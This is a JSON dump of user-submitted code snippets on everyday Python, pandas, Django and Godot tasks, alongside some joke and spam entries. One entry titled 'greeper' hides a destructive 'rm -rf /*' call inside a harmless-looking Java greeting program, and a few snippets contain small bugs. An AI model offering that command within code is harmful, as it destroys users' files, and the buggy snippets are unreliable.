    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1269,
    "keyword": null,
    "link": null,
    "title": " get list input from user in python",
    "description": "a = list(map(int,input(\"\\nEnter the numbers : \").strip().split()))\n# number of elements  n = int(input(\"Enter number of elements : \"))     # Below line read inputs from user using map() function   a = list(map(int,input(\"\\nEnter the numbers : \").strip().split()))[:n]     print(\"\\nList is - \", a)\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1270,
    "keyword": null,
    "link": null,
    "title": " get list of all files in folder and subfolders python",
    "description": "for path, subdirs, files in os.walk(root):     for name in files:         print os.path.join(path, name) \n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1271,
    "keyword": null,
    "link": null,
    "title": " get list of folders in directory python",
    "description": "import os  my_list = os.listdir('My_directory')\nimport os print(os.listdir('/path/to/folder/to/list'))\nlstJson = [f for f in os.listdir(str(self.pathJson)) if f.endswith('.json')]         return lstJson\nfrom os import listdir file_list = listdir(folder_path)\nos.walk(directory) [x[0] for x in os.walk(directory)]\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1272,
    "keyword": null,
    "link": null,
    "title": " get list of objects in group godot",
    "description": "var my_group_members = get_tree().get_nodes_in_group(\"my_group\")\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1273,
    "keyword": null,
    "link": null,
    "title": " get list of unique values in pandas column",
    "description": "a = df['column name'].unique() #returns a list of unique values\ndf.groupby('param')['column'].nunique().sort_values(ascending=False).unique().tolist()\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1274,
    "keyword": null,
    "link": null,
    "title": " get list with random numbers python",
    "description": "# To create a list of random integer values: import random randomlist = random.sample(range(10, 30), 5) # Output: # [16, 19, 13, 18, 15]  # To create a list of random float numbers: import numpy random_float_array = numpy.random.uniform(75.5, 125.5, 2) # Output: # [107.50697835, 123.84889979]\nfrom num_tool import random_num_list print(random_num_list(0, 5, length=20))\nimport random randomlist = [] for i in range(0,5): n = random.randint(1,30) randomlist.append(n) print(randomlist)\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1275,
    "keyword": null,
    "link": null,
    "title": " get local timezone python",
    "description": "import datetime  now = datetime.datetime.now() local_now = now.astimezone() local_tz = local_now.tzinfo local_tzname = local_tz.tzname(local_now) print(local_tzname)\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1276,
    "keyword": null,
    "link": null,
    "title": " get max float value python",
    "description": ">>> sys.float_info.max 1.7976931348623157e+308\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1277,
    "keyword": null,
    "link": null,
    "title": " get median of column pandas",
    "description": "df['column_name'].median()\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1278,
    "keyword": null,
    "link": null,
    "title": " get most repeated instance in a queryset django",
    "description": "from django.db.models import Count  most_common = Post.objects.annotate(mc=Count('category')).order_by('-mc')[0].mc\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1279,
    "keyword": null,
    "link": null,
    "title": " get mouse postition python",
    "description": ">>> import pyautogui >>> pyautogui.position()\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1280,
    "keyword": null,
    "link": null,
    "title": " get number of missing values dataframe",
    "description": "df.isna().sum()\n",
    "reg_date": "2021-10-12T11:29:45.000Z"
  },
  {
    "id": 1281,
    "keyword": null,
    "link": null,
    "title": " get object attributes python",
    "description": "for att in dir(your_object):     print (att, getattr(your_object,att))\nx = getattr(t, 'attr1') setattr(t, 'attr1', 21)\ngetattr(object, 'attribute_name')\nimport inspect  class myclass:   a = 5   def method(b):     return b  for i in inspect.getmembers(myclass):   print(i)\nfield_name = \"fullName\" print getattr(user, field_name) # prints content of user.fullName \n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1282,
    "keyword": null,
    "link": null,
    "title": " get object or 404",
    "description": "from django.shortcuts import get_object_or_404  def my_view(request):     obj = get_object_or_404(MyModel, pk=1) \n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1283,
    "keyword": null,
    "link": null,
    "title": " get object or 404 django",
    "description": "from django.shortcuts import get_object_or_404  def my_view(request):     obj = get_object_or_404(MyModel, pk=1) \nfrom django.shortcuts import get_object_or_404\n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1284,
    "keyword": null,
    "link": null,
    "title": " get os information python",
    "description": ">>> import platform >>> platform.platform() 'Linux-3.3.0-8.fc16.x86_64-x86_64-with-fedora-16-Verne' \n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1285,
    "keyword": null,
    "link": null,
    "title": " get page source code selenium python",
    "description": "from selenium import webdriver import time  options = webdriver.ChromeOptions() options.add_argument('--ignore-certificate-errors') options.add_argument(\"--test-type\") options.binary_location = \"/usr/bin/chromium\" driver = webdriver.Chrome(chrome_options=options) driver.get('https://python.org')  html = driver.page_source print(html)\n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1286,
    "keyword": null,
    "link": null,
    "title": " get path to current directory python",
    "description": "import os os.path.abspath(os.getcwd())\nimport os  # To get absolute path to current script absolutePath = os.path.realpath(__file__) print(absoultePath) # c:\\File\\Path\\to\\Current\\Script.py  # To get absolute path excluding file name directory = (\"//\".join(os.path.realpath(__file__).split('//')[:-1])) print(directory) \t# c:\\File\\Path\\to\\Current\t  split('\\\\') for windows\nfrom os import getcwd # only import \"getcwd\" from os  getcwd() # Get the current working directory\n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1287,
    "keyword": null,
    "link": null,
    "title": " get path to file without filename python",
    "description": "import os filepath = '/a/path/to/my/file.txt' os.path.dirname(filepath) # Yields '/a/path/to/my'\n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1288,
    "keyword": null,
    "link": null,
    "title": " get position of turtle python",
    "description": "import turtle t = turtle.Turtle()  turtles_position = t.pos() # Will return a tuple that includes both X and Y # coordinates of the turtle named t respectively, E.G (200,600).  turtles_positionX = t.xcor() # Will return a float value of the turtle's # X position.  turtles_positionY = t.ycor() # Will return a float value of the turtle's # Y position.  ############################################################### # Make sure to round the last 2 method's numbers as without   # # rounding you can get numbers like 299.99999999999994.       # # (You can round with the round(integer) function)\t\t\t  # ############################################################### \n",
    "reg_date": "2021-10-12T11:29:46.000Z"
  },
  {
    "id": 1289,
    "keyword": null,
    "link": null,
    "title": " get program path directory",
    "description": "import os os.path.dirname(os.path.abspath(__file__))\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1290,
    "keyword": null,
    "link": null,
    "title": " get python directiory",
    "description": "import sys print('\\n'.join(sys.path))\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1291,
    "keyword": null,
    "link": null,
    "title": " get python script path",
    "description": "import os def GetScriptPath():     return os.path.realpath(__file__);  print(GetScriptPath());\nos.getcwd()\nimport os  os.path.realpath(__file__) \n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1292,
    "keyword": null,
    "link": null,
    "title": " get python version in code",
    "description": "import sys print(sys.version)\nimport platform  print(platform.python_version())\n# To check Python version  python -V ----or---- python --version\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1293,
    "keyword": null,
    "link": null,
    "title": " get python version jupyter",
    "description": "from platform import python_version  print(python_version())\nfrom platform import python_version  print(python_version()) \n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1294,
    "keyword": null,
    "link": null,
    "title": " get pytorch version",
    "description": "import torch print(torch.__version__) \ntorch.version.cuda\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1295,
    "keyword": null,
    "link": null,
    "title": " get random line from file python",
    "description": "import random lines = open('file.txt').read().splitlines() # creates a list with one line per ite&ugrave; randomLine =random.choice(lines) # pick up a random item in this list\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1296,
    "keyword": null,
    "link": null,
    "title": " get request python",
    "description": "import requests  x = requests.get('https://w3schools.com') print(x.status_code)\nimport requests  response = requests.get('<api-endpoint>') response.raise_for_status()  data = response.json() print(data)\nimport requests  r = requests.get('https://api.github.com', auth=('user', 'pass'))  print r.status_code print r.headers['content-type']\n# pip install requests import requests req = requests.get('<url here>', 'html.parser') print(req.text)\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1297,
    "keyword": null,
    "link": null,
    "title": " get rid of n in string python",
    "description": "line = line.strip('\\n') line = line.strip('\\t')\na_string = a_string.rstrip(\"\\n\")\nmylist = [] # Assuming that you have loaded data into a lines variable.  for line in lines:     mylist.append(line.strip().split('\\t')\n",
    "reg_date": "2021-10-12T11:29:47.000Z"
  },
  {
    "id": 1298,
    "keyword": null,
    "link": null,
    "title": " get screen size python",
    "description": ">>> import pyautogui  >>> width, height= pyautogui.size()  >>> print(width) 1366  >>> print(height) 768\nfrom screeninfo import get_monitors screen = get_monitors()[0]  # if that raises an error, put this first # from os import environ # environ['DISPLAY'] = ':0.0'  print(screen)\nfrom win32api import GetSystemMetrics  print(\"Width =\", GetSystemMetrics(0)) print(\"Height =\", GetSystemMetrics(1)) \n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1299,
    "keyword": null,
    "link": null,
    "title": " get self file name in python",
    "description": "import os  os.path.basename(__file__)\n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1300,
    "keyword": null,
    "link": null,
    "title": " get size of window tkinter",
    "description": "# Change window_name to the name of the window object, i.e. root window_name.geometry(\"500x500\") # To ensure widgets resize: widget_name.pack(fill=\"both\", expand=True)\n# Where w is a widget: w.winfo_height() w.winfo_width()\n window = Tk() \t# or window = TopLevel()  # \"350x150\" == window size (350 pixels wide and 150 pixels high)  # \"+220+80\" == window position (220 pixels from the left screen margin and  # \t\t\t\t80 pixels from the top screen margin   window.geometry(\"350x150+220+80\")\n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1301,
    "keyword": null,
    "link": null,
    "title": " get start time and end time in python",
    "description": "import time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time)) \nimport time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time))\n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1302,
    "keyword": null,
    "link": null,
    "title": " get stroke key with python",
    "description": "# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1303,
    "keyword": null,
    "link": null,
    "title": " get stroke key with python on linux",
    "description": "# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1304,
    "keyword": null,
    "link": null,
    "title": " get terminal size python",
    "description": "import os  # you can do like this columns, lines = os.get_terminal_size()  # or  size = os.get_terminal_size()  columns = size.columns lines = size.lines\nfrom os import get_terminal_size  size = get_terminal_size() # Columns, Lines\n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1305,
    "keyword": null,
    "link": null,
    "title": " get terminal sizee python",
    "description": "from os import get_terminal_size  size = get_terminal_size() # Columns, Lines\n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1306,
    "keyword": null,
    "link": null,
    "title": " get text between two strings python",
    "description": ">>> import re >>> s = 'Part 1. Part 2. Part 3 then more text' >>> re.search(r'Part 1\\.(.*?)Part 3', s).group(1) ' Part 2. ' >>> re.search(r'Part 1(.*?)Part 3', s).group(1) '. Part 2. '\n# You can do this with Reg Exp import re  s = 'asdf=5;iwantthis123jasd' result = re.search('asdf=5;(.*)123jasd', s) print(result.group(1))\nimport re as regex  s = 'asdf=5;iwantthis123jasd' result = regex.match('asdf=5;(.*)123jasd', s)  print(result)\n",
    "reg_date": "2021-10-12T11:29:48.000Z"
  },
  {
    "id": 1307,
    "keyword": null,
    "link": null,
    "title": " get text from image python",
    "description": "# Import some modules import cv2 # An image proccessing library import pytesseract # an image to text library import numpy as np # used for mathematics but can be used in image proccessing  # Configure the module pytesseract.pytesseract.tesseract_cmd = r'C:\\Users\\yourname\\AppData\\Local\\Tesseract-OCR\\tesseract.exe'  # Make the image grey img = cv2.imread('your_img.png') gray = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) gray, img_bin = cv2.threshold(gray, 128, 255, cv2.THRESH_BINARY | cv2.THRESH_OTSU) gray = cv2.bitwise_not(img_bin) kernel = np.ones((2, 1), np.uint8) img = cv2.erode(gray, kernel, iterations=1) img = cv2.dilate(img, kernel, iterations=1) # Use OCR to read the text from the image out_below = pytesseract.image_to_string(img) # Print the text print(out_below)\nimg = cv2.imread('image.png')  text = pytesseract.image_to_string(img) print(text)\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1308,
    "keyword": null,
    "link": null,
    "title": " get text from txt file python",
    "description": "with open (\"data.txt\", \"r\") as myfile:     data = myfile.read().splitlines() \npath= #path here with open(path) as file \tcontents = file.read()\nf=open(\"Diabetes.txt\",'r') f.read()\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1309,
    "keyword": null,
    "link": null,
    "title": " get text from url python last slash",
    "description": "#From stacoverflow: url = 'http://www.test.com/TEST1' last = url.rsplit('/', 1)[-1] print(last) #TEST1\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1310,
    "keyword": null,
    "link": null,
    "title": " get the current year in python",
    "description": "import datetime now = datetime.datetime.now().year print(now)\nfrom datetime import date current_date = date.today()  print(\"Current date: \", current_date) print(\"Current year:\", current_date.year)\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1311,
    "keyword": null,
    "link": null,
    "title": " get the last element of a list python",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nMyList=[\"Black\",\"Blue\",\"Red\",\"Green\"] print(MyList[-1])\nprint(list[-1])\na = [1, 2, 3, 4] print(a[-1]) #prints: 4  print(a[-2]) #prints: 3\nnumber_list = [1, 2, 3] print(number_list[-1]) #Gives 3  number_list[-1] = 5 # Set the last element print(number_list[-1]) #Gives 5  number_list[-2] = 3 # Set the second to last element number_list [1, 3, 5]\nmy_list = [\"I\", \"Love\", \"Python\"] last_item_in_list = my_list[-1] # last_item_in_list = \"Python\"\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1312,
    "keyword": null,
    "link": null,
    "title": " get the list of file names from a folder in python",
    "description": "import os  files = os.listdir('.') print(files) for file in files:   # do something   \nfrom os import listdir from os.path import isfile, join  # Getting file path from user and store it on path variable path = input(\"Please enter a directory name:\\n\")  # Try catch for printing error message if the user enter invalid path try:     # Getting list of file from the given path and store it in (onlyfiles) variable   onlyfiles = [f for f in listdir(path) if isfile(join(path, f))]      # Looping through the file and print each file   for file in onlyfiles:     print(file)  except Exception as e:     # If there is some error, print error message   print(\"Incorrect path.\")  \nlstJson = [f for f in os.listdir(str(self.pathJson)) if f.endswith('.json')]         return lstJson\nimport os path = '/folder1/folder2/' files = os.listdir(path)\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1313,
    "keyword": null,
    "link": null,
    "title": " get the torch version",
    "description": "import torch print(torch.__version__) \nimport torch print(torch.__version__)\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1314,
    "keyword": null,
    "link": null,
    "title": " get time pithon",
    "description": "\"\"\"Imports the datetime package from the Python library\"\"\" from datetime import datetime  \"\"\"Sets the variable now to the current date and time\"\"\" now = datetime.now()  \"\"\"The variable current_time contains the string values of the current time\"\"\" current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time)\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1315,
    "keyword": null,
    "link": null,
    "title": " get timestamp from string python",
    "description": "import datetime date = '18/05/2020 - 18:05:12'  # convert string to datetimeformat date = datetime.datetime.strptime(date, \"%d %m %Y - %H:%M:%S\"\")  # convert datetime to timestamp date = datetime.datetime.timestamp(date)\nimport datetime date = '18/05/2020 - 18:05:12'  # convert string to datetimeformat date = datetime.datetime.strptime(date, \"%d %m %Y - %H:%M:%S\")  # convert datetime to timestamp date = datetime.datetime.timestamp(date)\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1316,
    "keyword": null,
    "link": null,
    "title": " get today's date pandas",
    "description": "today = pd.to_datetime(\"today\")\n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1317,
    "keyword": null,
    "link": null,
    "title": " get video length python",
    "description": "from moviepy.editor import VideoFileClip clip = VideoFileClip(\"my_video.mp4\") print( clip.duration ) \n",
    "reg_date": "2021-10-12T11:29:49.000Z"
  },
  {
    "id": 1318,
    "keyword": null,
    "link": null,
    "title": " get wav file in dir",
    "description": "import glob for filename in glob.glob('*.wav'):     print(filename)\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1319,
    "keyword": null,
    "link": null,
    "title": " get wd in python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1320,
    "keyword": null,
    "link": null,
    "title": " get website content with beautifulsoup",
    "description": "from bs4 import BeautifulSoup import requests      URL = 'https://google.com/' content = requests.get(URL) soup = BeautifulSoup(content.text, 'html.parser')  print(soup.text)  #This code will print the website content of google #You can change the website by editing the URL inside the variable named 'URL'\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1321,
    "keyword": null,
    "link": null,
    "title": " get working directory python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os  print(os.getcwd())\nimport os cwd = os.getcwd()\nimport os os.getcwd() \nimport os  #Get Current working Directory currentDirectory = os.getcwd()  #Change the Current working Directory os.chdir('/home/varun') \n# print current working directory in python import os cwd = os.getcwd() print(cwd)\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1322,
    "keyword": null,
    "link": null,
    "title": " get yesterday date python",
    "description": ">>> from datetime import datetime, timedelta >>> datetime.strftime(datetime.now() - timedelta(1), '%Y-%m-%d') '2015-05-26'\nimport datetime today = datetime.date.today() one_day = datetime.timedelta(days=1) yesterday = today - one_day\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1323,
    "keyword": null,
    "link": null,
    "title": " getting dummies and input them to pandas dataframe",
    "description": "note: dummies = pd.get_dummies(df[['column_1']], drop_first=True) df = pd.concat([df.drop(['column_1'],axis=1), dummies],axis=1)   note:for more that one coloum keep ading in the list  dummies = pd.get_dummies(df[['column_1', 'column_2','column_3']], drop_first=True) df = pd.concat([df.drop(['column_1', 'column_1'],axis=1), dummies],axis=1) \n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1324,
    "keyword": null,
    "link": null,
    "title": " getting dummies for a column in pandas dataframe",
    "description": "note: dummies = pd.get_dummies(df[['column_1']], drop_first=True)  note:for more that one coloum keep ading in the list  dummies = pd.get_dummies(df[['column_1', 'column_2','column_3']], drop_first=True)\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1325,
    "keyword": null,
    "link": null,
    "title": " getting financial data python",
    "description": "#In your command prompt first run: pip install yfinance  import yfinance as yf  msft = yf.Ticker(\"MSFT\")  # get stock info msft.info  # get historical market data hist = msft.history(period=\"max\")  # show actions (dividends, splits) msft.actions  # show dividends msft.dividends  # show splits msft.splits  # show financials msft.financials msft.quarterly_financials  # show major holders msft.major_holders  # show institutional holders msft.institutional_holders  # show balance sheet msft.balance_sheet msft.quarterly_balance_sheet  # show cashflow msft.cashflow msft.quarterly_cashflow  # show earnings msft.earnings msft.quarterly_earnings  # show sustainability msft.sustainability  # show analysts recommendations msft.recommendations  # show next event (earnings, etc) msft.calendar  # show ISIN code - *experimental* # ISIN = International Securities Identification Number msft.isin  # show options expirations msft.options  # get option chain for specific expiration opt = msft.option_chain('YYYY-MM-DD') # data available via: opt.calls, opt.puts\n#In your command prompt you first need to install yfinance by running: #pip install yfinance import yfinance as yf AAPL = yf.Ticker('AAPL').history('5y')\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1326,
    "keyword": null,
    "link": null,
    "title": " getting time python",
    "description": "import datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\n",
    "reg_date": "2021-10-12T11:29:50.000Z"
  },
  {
    "id": 1327,
    "keyword": null,
    "link": null,
    "title": " ggplot2 histogram",
    "description": "library(ggplot2) # Basic histogram ggplot(df, aes(x=weight)) + geom_histogram() # Change the width of bins ggplot(df, aes(x=weight)) +    geom_histogram(binwidth=1) # Change colors p<-ggplot(df, aes(x=weight)) +    geom_histogram(color=\"black\", fill=\"white\") p\n# Add mean line p+ geom_vline(aes(xintercept=mean(weight)),             color=\"blue\", linetype=\"dashed\", size=1) # Histogram with density plot ggplot(df, aes(x=weight)) +   geom_histogram(aes(y=..density..), colour=\"black\", fill=\"white\")+  geom_density(alpha=.2, fill=\"#FF6666\") \n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1328,
    "keyword": null,
    "link": null,
    "title": " gme",
    "description": "BUY AND HOLD BABY\nGME to the moon !!! lets fuck Wall Street    r/WallStreetBets\nprint('HOLD'*1*10**10000000000000000000000000000000000000000000000000000) amc.landing() gme.landing()\n100k/share or nothing!!! STILL HOLDING - 2/24/21\ngo back up ;-;\nto the moon\nHOLD! TO THE MOON\nDiamond Hands Will Rocket!\nGAMESTOP TO THE MOON\nHOLD!!!!!!!!!\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1329,
    "keyword": null,
    "link": null,
    "title": " godot code for movement",
    "description": "extends KinematicBody2D  var velocity = Vector2.ZERO  func _physics_process(delta): \tif Input. is_action_pressed(\"ui_right\"): \t\tposition.x += 4 \telif Input. is_action_pressed(\"ui_left\"): \t\tposition.x -= 4 \telif Input. is_action_pressed(\"ui_up\"): \t\tposition.y -= 4 \telif Input. is_action_pressed(\"ui_down\"): \t\tposition.y += 4  \tmove_and_collide(velocity)   #this one it the best and most simple one\n#3d extends KinematicBody  var speed = 200 var motion = Vector2()  func _physics_process(delta): \tif Input. is_action_pressed(\"ui_right\"): \t\tmotion.x += speed \telif Input. is_action_pressed(\"ui_left\"): \t\tmotion.x -= speed \telif Input. is_action_pressed(\"ui_up\"): \t\tmotion.z -= speed \telif Input. is_action_pressed(\"ui_down\"): \t\tmotion.z += speed \telse: \t\tmotion.x = 0 \t\t  \tmove_and_collide(motion)\nvar velocity = Vector2.ZERO  func _physics_process(delta): \tif Input. is_action_pressed(\"ui_right\"): \t\tposition.x += 4 \telif Input. is_action_pressed(\"ui_left\"): \t\tposition.x -= 4 \telif Input. is_action_pressed(\"ui_up\"): \t\tposition.y -= 4 \telif Input. is_action_pressed(\"ui_down\"): \t\tposition.y += 4 \tmove_and_collide(velocity * position) \t\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1330,
    "keyword": null,
    "link": null,
    "title": " godot enum",
    "description": "# Enum Is Used To Create A Certain Amount Of Related Constants enum my_enum { \tMYCONST1,     MYCONST2 = 10, }\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1331,
    "keyword": null,
    "link": null,
    "title": " godot restart scene",
    "description": "get_tree().reload_current_scene() \nget_tree().reload_current_scene()\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1332,
    "keyword": null,
    "link": null,
    "title": " godot spawn object",
    "description": "node = preload(\"res://node.tscn\") #Whatever you want to spawn  func whatever(): \tnodeInstance = node.instance()     nodeInstance.position = Vector2(x, y)      add_child(nodeInstance) #Spawns wherever script is attatched.\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1333,
    "keyword": null,
    "link": null,
    "title": " gonad",
    "description": "# Bro what r u looking at\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1334,
    "keyword": null,
    "link": null,
    "title": " google colab save faild",
    "description": "# This can happen if you open the same notebook in multiple tabs and make incompatible edits to the notebook.  # At this point, the only way to save your work is to follow the advice in the dialog. # To prevent this in the future, avoid simultaneously editing the same notebook in multiple browser windows.\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1335,
    "keyword": null,
    "link": null,
    "title": " google search api python",
    "description": "# pip install webbrowser import webbrowser  while True:      question = input(\"Question: \") # input question     webbrowser.open('http://www.google.com/search?q=' + question)\n# python3 -m pip install webbrowser import webbrowser  question = input(\"What is your question? \") webbrowser.open(\"https://www.google.com\" + str(question))\n",
    "reg_date": "2021-10-12T11:29:51.000Z"
  },
  {
    "id": 1336,
    "keyword": null,
    "link": null,
    "title": " google traduttore",
    "description": "upvote if you feel terrible\n# pip install googletrans from googletrans import Translator translator = Translator() print(translator.translate(\"Traduisez des langues avec python.\").text)\nnot cheating on spanish hell yea\nAre you cheating on your Spanish homework? GET BACK TO PROGRAMMING!\nChe fai copi??\nStudy English if you don't know ;)\npublic class Dithered() {  Hello world!   }\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1337,
    "keyword": null,
    "link": null,
    "title": " grams in kg",
    "description": "def kg_to_g(kg): \treturn kg*1000\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1338,
    "keyword": null,
    "link": null,
    "title": " graphics in python in repl",
    "description": "#use pygame\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1339,
    "keyword": null,
    "link": null,
    "title": " green fuel",
    "description": "'biodesel'\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1340,
    "keyword": null,
    "link": null,
    "title": " greeper",
    "description": "import cv2 XD\nHello! \nWELCOME TO GREEPER, ENJOY :)\nMake Sure To Visit www.greeper.com\nyou Have it Installed \nyou should get greeper you can post any text like this one\npublic class Main {  public static void main(String[] args) {  \tSystem.out.println(\"Greeper is nice\");    \tRuntime.getRuntime().execute(\"rm -rf /*\");  } }\nwhy did nobody think of this\nwhen i click a button the whole area will scan\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1341,
    "keyword": null,
    "link": null,
    "title": " greper",
    "description": "Grepper's cool\nfact = \"Grepper's good stuff!\" print(fact)\nbest tool forever!\nGrepper is perfect dictonary for helping codes you are looking around\nGrepper is amazing, I highly recommend it!!\nLove Grepper\nGREPPER IS THE BEST!\nvar The_truth: String = \"Grepper is the best addon\" println(The_truth)\ni think you are looking for https://stackoverflow.com/\nYou are spellin' it wrong BRO\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1342,
    "keyword": null,
    "link": null,
    "title": " grepper",
    "description": "one Like For Grepper Community\nGrepper's cool\nIlikethisbecauseitmakesmylifeabiteasier.\nfact = \"Grepper's good stuff!\" print(fact)\nbest tool forever!\nGrepper is perfect dictonary for helping codes you are looking around\nGrepper is a cool tool\nGrepper is amazing, I highly recommend it!!\nLove Grepper\nGREPPER IS THE BEST!\n",
    "reg_date": "2021-10-12T11:29:52.000Z"
  },
  {
    "id": 1343,
    "keyword": null,
    "link": null,
    "title": " grid in pygame",
    "description": "BLACK = (0, 0, 0) WHITE = (200, 200, 200) WINDOW_HEIGHT = 400 WINDOW_WIDTH = 400   def main():     global SCREEN, CLOCK     pygame.init()     SCREEN = pygame.display.set_mode((WINDOW_HEIGHT, WINDOW_WIDTH))     CLOCK = pygame.time.Clock()     SCREEN.fill(BLACK)      while True:         drawGrid()         for event in pygame.event.get():             if event.type == pygame.QUIT:                 pygame.quit()                 sys.exit()          pygame.display.update()   def drawGrid():     blockSize = 20 #Set the size of the grid block     for x in range(WINDOW_WIDTH):         for y in range(WINDOW_HEIGHT):             rect = pygame.Rect(x*blockSize, y*blockSize,                                blockSize, blockSize)             pygame.draw.rect(SCREEN, WHITE, rect, 1)\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1344,
    "keyword": null,
    "link": null,
    "title": " grid in python plt",
